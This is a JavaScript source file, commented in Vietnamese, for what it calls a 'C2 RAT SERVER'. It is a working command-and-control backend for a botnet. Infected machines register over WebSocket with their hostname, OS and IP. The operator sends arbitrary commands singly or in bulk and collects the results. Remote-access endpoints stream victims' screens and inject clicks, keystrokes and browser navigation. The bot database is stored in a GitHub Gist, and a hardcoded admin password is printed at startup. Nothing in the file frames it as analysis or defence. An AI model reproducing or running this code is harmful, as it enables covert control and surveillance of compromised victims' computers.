const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// --- IMPORT GITHUB API ---
const { Octokit } = require('@octokit/rest');

// --- INIT ---
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================================
//  CONFIG GITHUB GIST
// ============================================================
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GIST_ID = process.env.GIST_ID || '';
const GIST_FILENAME = 'c2_db.json';

// Khởi tạo Octokit
let octokit = null;
if (GITHUB_TOKEN && GIST_ID) {
    octokit = new Octokit({ auth: GITHUB_TOKEN });
    console.log('✅ GitHub Gist configured');
} else {
    console.log('⚠️ GitHub Gist not configured, using local backup only');
}

// ============================================================
//  DATABASE - MEMORY + GITHUB GIST SYNC
// ============================================================

// 1. Dữ liệu trong bộ nhớ
const DB = {
    bots: [],
    commands: [],
    pending_commands: [],
    rat_sessions: [],
    admin_logs: []
};

// 2. Stream cache cho RAT
const streamCache = new Map();

// 3. Local backup path
const BACKUP_PATH = path.join(__dirname, 'data', 'db.json');

// Tạo thư mục data
if (!fs.existsSync(path.dirname(BACKUP_PATH))) {
    fs.mkdirSync(path.dirname(BACKUP_PATH), { recursive: true });
}

// ============================================================
//  GITHUB GIST FUNCTIONS
// ============================================================

// Lấy dữ liệu từ Gist
async function fetchFromGist() {
    if (!octokit) return null;
    try {
        const response = await octokit.gists.get({
            gist_id: GIST_ID
        });
        const files = response.data.files;
        if (files && files[GIST_FILENAME]) {
            const content = files[GIST_FILENAME].content;
            return JSON.parse(content);
        }
        return null;
    } catch (error) {
        console.error('❌ Lỗi fetch từ Gist:', error.message);
        return null;
    }
}

// Lưu dữ liệu lên Gist
async function saveToGist(data) {
    if (!octokit) return false;
    try {
        const content = JSON.stringify(data, null, 2);
        await octokit.gists.update({
            gist_id: GIST_ID,
            files: {
                [GIST_FILENAME]: {
                    content: content
                }
            }
        });
        console.log('✅ Đã sync lên GitHub Gist');
        return true;
    } catch (error) {
        console.error('❌ Lỗi sync lên Gist:', error.message);
        return false;
    }
}

// ============================================================
//  DATABASE OPERATIONS
// ============================================================

// Đọc database (ưu tiên Gist, fallback local)
async function loadDatabase() {
    // Thử lấy từ Gist trước
    if (octokit) {
        const gistData = await fetchFromGist();
        if (gistData) {
            console.log('✅ Load database từ GitHub Gist');
            DB.bots = gistData.bots || [];
            DB.commands = gistData.commands || [];
            DB.pending_commands = gistData.pending_commands || [];
            DB.rat_sessions = gistData.rat_sessions || [];
            DB.admin_logs = gistData.admin_logs || [];
            saveLocalBackup();
            return;
        }
    }
    
    // Fallback: load từ local backup
    try {
        if (fs.existsSync(BACKUP_PATH)) {
            const data = fs.readFileSync(BACKUP_PATH, 'utf8');
            const parsed = JSON.parse(data);
            DB.bots = parsed.bots || [];
            DB.commands = parsed.commands || [];
            DB.pending_commands = parsed.pending_commands || [];
            DB.rat_sessions = parsed.rat_sessions || [];
            DB.admin_logs = parsed.admin_logs || [];
            console.log('✅ Load database từ local backup');
            // Nếu có Gist, sync lên
            if (octokit) {
                saveToGist(DB).catch(() => {});
            }
            return;
        }
    } catch (e) {
        console.log('⚠️ Không có local backup');
    }
    
    console.log('📝 Tạo database mới');
}

// Lưu database (local + Gist)
async function saveDatabase() {
    // Lưu local backup
    saveLocalBackup();
    
    // Sync lên Gist
    if (octokit) {
        await saveToGist(DB);
    }
}

// Lưu local backup
function saveLocalBackup() {
    try {
        const data = JSON.stringify({
            bots: DB.bots,
            commands: DB.commands,
            pending_commands: DB.pending_commands,
            rat_sessions: DB.rat_sessions,
            admin_logs: DB.admin_logs
        }, null, 2);
        fs.writeFileSync(BACKUP_PATH, data);
        return true;
    } catch (e) {
        console.error('❌ Lỗi local backup:', e);
        return false;
    }
}

// Sync database (gọi khi có thay đổi)
async function syncDB() {
    await saveDatabase();
}

// ============================================================
//  AUTO SYNC - Mỗi 30 giây
// ============================================================
setInterval(async () => {
    if (octokit) {
        await saveToGist(DB).catch(() => {});
    }
}, 30000);

// Sync khi shutdown
process.on('SIGINT', async () => {
    await saveDatabase();
    process.exit();
});
process.on('SIGTERM', async () => {
    await saveDatabase();
    process.exit();
});

// ============================================================
//  AUTH
// ============================================================
const ADMIN_PASSWORD = 'H3XTEK0';
const auth = (req, res, next) => {
    const token = req.headers['authorization'];
    if (!token || token !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
};

// ============================================================
//  WEBSOCKET
// ============================================================
const botClients = new Map();

wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '0.0.0.0';
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            const botId = data.bot_id;
            if (!botId) return;

            if (data.type === 'register') {
                botClients.set(botId, ws);
                
                const existing = DB.bots.findIndex(b => b.bot_id === botId);
                const bot = {
                    bot_id: botId,
                    group_name: data.group || 'default',
                    version: data.version || '1.0.0',
                    os: data.os || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    ip: clientIp,
                    last_seen: Date.now(),
                    online: 1,
                    screen_width: data.screen_width || 1920,
                    screen_height: data.screen_height || 1080
                };
                if (existing !== -1) {
                    DB.bots[existing] = { ...DB.bots[existing], ...bot };
                } else {
                    DB.bots.push(bot);
                }
                await syncDB();

                const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
                pendings.forEach(p => {
                    sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
                });
                DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
                await syncDB();

                console.log(`[BOT] Registered: ${botId}`);
                ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
            }

            else if (data.type === 'heartbeat') {
                const bot = DB.bots.find(b => b.bot_id === botId);
                if (bot) {
                    bot.last_seen = Date.now();
                    bot.online = 1;
                }
            }

            else if (data.type === 'result') {
                const cmd = DB.commands.find(c => c.cmd_id === data.cmd_id);
                if (cmd) {
                    cmd.result = data.result;
                    cmd.status = data.status || 'ok';
                    cmd.executed_at = Date.now();
                    await syncDB();
                }
                console.log(`[RESULT] ${botId}: ${data.cmd_id}`);
            }

            else if (data.type === 'rat_stream') {
                streamCache.set(botId, {
                    frame: data.image,
                    timestamp: data.timestamp || Date.now()
                });
                if (streamCache.size > 100) {
                    const keys = streamCache.keys();
                    for (let i = 0; i < 50; i++) {
                        const key = keys.next().value;
                        if (key) streamCache.delete(key);
                    }
                }
            }

        } catch (e) {
            console.error('WS Error:', e);
        }
    });

    ws.on('close', async () => {
        for (let [id, client] of botClients.entries()) {
            if (client === ws) {
                botClients.delete(id);
                const bot = DB.bots.find(b => b.bot_id === id);
                if (bot) {
                    bot.online = 0;
                    await syncDB();
                }
                break;
            }
        }
    });
});

function sendCommand(ws, botId, cmdId, command, args = []) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'command',
            payload: { cmd_id: cmdId, command, args }
        }));
        return true;
    }
    return false;
}

// ============================================================
//  API
// ============================================================

// Lấy danh sách bot
app.get('/api/bots', auth, (req, res) => {
    res.json(DB.bots);
});

// Lấy bot online
app.get('/api/bots/online', auth, (req, res) => {
    res.json(DB.bots.filter(b => b.online === 1));
});

// Xóa bot
app.delete('/api/bots/:bot_id', auth, async (req, res) => {
    DB.bots = DB.bots.filter(b => b.bot_id !== req.params.bot_id);
    DB.commands = DB.commands.filter(c => c.bot_id !== req.params.bot_id);
    DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== req.params.bot_id);
    await syncDB();
    res.json({ status: 'deleted' });
});

// Xóa tất cả bot
app.delete('/api/bots', auth, async (req, res) => {
    DB.bots = [];
    DB.commands = [];
    DB.pending_commands = [];
    await syncDB();
    res.json({ status: 'all_deleted' });
});

// Gửi lệnh
app.post('/api/command', auth, async (req, res) => {
    const { bot_id, command, args = [] } = req.body;
    if (!bot_id || !command) {
        return res.status(400).json({ error: 'Missing bot_id or command' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    DB.commands.push({
        bot_id: bot_id,
        cmd_id: cmdId,
        command: command,
        args: JSON.stringify(args),
        result: null,
        status: 'pending',
        issued_at: Date.now(),
        executed_at: null
    });
    await syncDB();

    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        sendCommand(ws, bot_id, cmdId, command, args);
        res.json({ status: 'sent', cmd_id: cmdId });
    } else {
        DB.pending_commands.push({
            bot_id: bot_id,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            issued_at: Date.now()
        });
        await syncDB();
        res.json({ status: 'queued', cmd_id: cmdId });
    }
});

// Gửi lệnh hàng loạt
app.post('/api/command/bulk', auth, async (req, res) => {
    const { bot_ids, command, args = [] } = req.body;
    if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
        return res.status(400).json({ error: 'Missing bot_ids array' });
    }

    const results = [];
    for (const botId of bot_ids) {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        DB.commands.push({
            bot_id: botId,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            result: null,
            status: 'pending',
            issued_at: Date.now(),
            executed_at: null
        });
        
        const ws = botClients.get(botId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            sendCommand(ws, botId, cmdId, command, args);
            results.push({ bot_id: botId, status: 'sent', cmd_id: cmdId });
        } else {
            DB.pending_commands.push({
                bot_id: botId,
                cmd_id: cmdId,
                command: command,
                args: JSON.stringify(args),
                issued_at: Date.now()
            });
            results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
        }
    }
    await syncDB();
    res.json({ results });
});

// Lấy kết quả lệnh
app.get('/api/results/:cmd_id', auth, (req, res) => {
    const cmd = DB.commands.find(c => c.cmd_id === req.params.cmd_id);
    res.json(cmd || {});
});

// Lấy kết quả cuối (cho RAT)
app.get('/api/results/latest/:bot_id', auth, (req, res) => {
    const cached = streamCache.get(req.params.bot_id);
    if (cached && cached.frame) {
        return res.json({
            cmd_id: 'stream-latest',
            result: cached.frame,
            status: 'ok',
            executed_at: cached.timestamp
        });
    }
    
    const cmd = DB.commands
        .filter(c => c.bot_id === req.params.bot_id && c.command === 'sc')
        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0))[0];
    res.json(cmd || {});
});

// Lấy lịch sử
app.get('/api/history/:bot_id', auth, (req, res) => {
    const history = DB.commands
        .filter(c => c.bot_id === req.params.bot_id)
        .sort((a, b) => b.issued_at - a.issued_at)
        .slice(0, 50);
    res.json(history);
});

// Lấy tất cả commands
app.get('/api/commands', auth, (req, res) => {
    res.json(DB.commands);
});

// Xóa command
app.delete('/api/commands/:cmd_id', auth, async (req, res) => {
    DB.commands = DB.commands.filter(c => c.cmd_id !== req.params.cmd_id);
    await syncDB();
    res.json({ status: 'deleted' });
});

// Lấy pending commands
app.get('/api/pending', auth, (req, res) => {
    res.json(DB.pending_commands);
});

// Xóa pending command
app.delete('/api/pending/:cmd_id', auth, async (req, res) => {
    DB.pending_commands = DB.pending_commands.filter(p => p.cmd_id !== req.params.cmd_id);
    await syncDB();
    res.json({ status: 'deleted' });
});

// Lấy admin logs
app.get('/api/logs', auth, (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    const logs = DB.admin_logs.sort((a, b) => b.timestamp - a.timestamp).slice(0, limit);
    res.json(logs);
});

// Xóa logs
app.delete('/api/logs', auth, async (req, res) => {
    DB.admin_logs = [];
    await syncDB();
    res.json({ status: 'cleared' });
});

// ============================================================
//  RAT API
// ============================================================

// RAT START
app.post('/api/rat/start', auth, (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    DB.rat_sessions.push({
        bot_id: bot_id,
        socket_id: 'ws-' + Date.now(),
        session_start: Date.now()
    });
    syncDB();

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, bot_id, cmdId, 'rat_start', []);
    res.json({ status: 'rat_started', bot_id });
});

// RAT STOP
app.post('/api/rat/stop', auth, async (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        sendCommand(ws, bot_id, cmdId, 'rat_stop', []);
    }
    DB.rat_sessions = DB.rat_sessions.filter(r => r.bot_id !== bot_id);
    streamCache.delete(bot_id);
    await syncDB();
    res.json({ status: 'rat_stopped', bot_id });
});

// RAT EVENT
app.post('/api/rat/event', auth, (req, res) => {
    const { bot_id, event_type, x, y, text, url } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    let command = 'rat_event';
    let args = [event_type];

    if (event_type === 'click' || event_type === 'rightclick' || event_type === 'doubleclick' || event_type === 'move') {
        args.push(x || 0, y || 0);
    } else if (event_type === 'key') {
        args.push(text || '');
    } else if (event_type === 'notepad') {
        command = 'rat_notepad';
        args = [text || ''];
    } else if (event_type === 'browser') {
        command = 'rat_browser';
        args = [url || 'https://www.google.com'];
    }

    sendCommand(ws, bot_id, cmdId, command, args);
    res.json({ status: 'event_sent', cmd_id: cmdId });
});

// RAT STREAM
app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    const ws = botClients.get(botId);
    
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, botId, cmdId, 'rat_stream', []);
    res.json({ status: 'stream_started', bot_id: botId });
});

// ============================================================
//  DATABASE MANAGEMENT API (WEB EDIT)
// ============================================================

// Xem toàn bộ database
app.get('/api/db', auth, (req, res) => {
    res.json(DB);
});

// Xem từng bảng
app.get('/api/db/bots', auth, (req, res) => res.json(DB.bots));
app.get('/api/db/commands', auth, (req, res) => res.json(DB.commands));
app.get('/api/db/pending', auth, (req, res) => res.json(DB.pending_commands));
app.get('/api/db/sessions', auth, (req, res) => res.json(DB.rat_sessions));
app.get('/api/db/logs', auth, (req, res) => res.json(DB.admin_logs));

// Thêm bot (POST)
app.post('/api/db/bots', auth, async (req, res) => {
    const botData = req.body;
    if (!botData.bot_id) {
        return res.status(400).json({ error: 'Missing bot_id' });
    }
    const existing = DB.bots.findIndex(b => b.bot_id === botData.bot_id);
    if (existing !== -1) {
        DB.bots[existing] = { ...DB.bots[existing], ...botData };
    } else {
        DB.bots.push(botData);
    }
    await syncDB();
    res.json({ status: 'added', bot: botData });
});

// Cập nhật bot (PUT)
app.put('/api/db/bots/:bot_id', auth, async (req, res) => {
    const botId = req.params.bot_id;
    const idx = DB.bots.findIndex(b => b.bot_id === botId);
    if (idx === -1) {
        return res.status(404).json({ error: 'Bot not found' });
    }
    DB.bots[idx] = { ...DB.bots[idx], ...req.body };
    await syncDB();
    res.json({ status: 'updated', bot: DB.bots[idx] });
});

// Xóa toàn bộ database
app.delete('/api/db', auth, async (req, res) => {
    DB.bots = [];
    DB.commands = [];
    DB.pending_commands = [];
    DB.rat_sessions = [];
    DB.admin_logs = [];
    await syncDB();
    res.json({ status: 'all_cleared' });
});

// Sync manual (force sync lên Gist)
app.post('/api/db/sync', auth, async (req, res) => {
    await saveDatabase();
    res.json({ status: 'synced', gist: !!octokit });
});

// ============================================================
//  DASHBOARD ROUTES
// ============================================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/rat', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'rat.html'));
});

app.get('/style.css', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'style.css'));
});

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', async () => {
    console.log('='.repeat(50));
    console.log('  C2 RAT SERVER STARTED');
    console.log(`  Port: ${PORT}`);
    console.log(`  Dashboard: http://localhost:${PORT}/`);
    console.log(`  RAT Control: http://localhost:${PORT}/rat`);
    console.log(`  Password: H3XTEK0`);
    console.log(`  GitHub Gist: ${octokit ? '✅ Connected' : '❌ Not configured'}`);
    console.log('='.repeat(50));
    
    // Load database
    await loadDatabase();
});